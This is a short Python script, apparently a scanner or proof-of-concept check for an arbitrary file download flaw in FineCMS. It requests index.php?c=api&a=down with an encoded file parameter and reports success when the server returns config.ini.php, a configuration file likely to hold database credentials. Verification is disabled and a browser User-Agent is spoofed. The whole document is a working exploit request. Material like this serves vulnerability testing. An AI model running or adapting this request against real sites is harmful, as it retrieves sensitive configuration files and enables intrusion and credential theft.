import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	url=baseurl+"index.php?c=api&a=down&file=NDgwNTA0M2RFRXRkc1ZTaGNuczJBSjZTSk9KSDVTYnFqL251K0lNRjBQK0tla0FBTVpHM3dLbU8yVTNWaE1SYTRtRXRjUlQ3bDd4cGRQeVRKMGVlcDEvQjNRVlA4bTNnMi9SZDRDSjBOUQs"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "filename=\"config.ini.php\"" in response.headers["Content-Disposition"] and "defined('IN_FINECMS')" in response.text:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
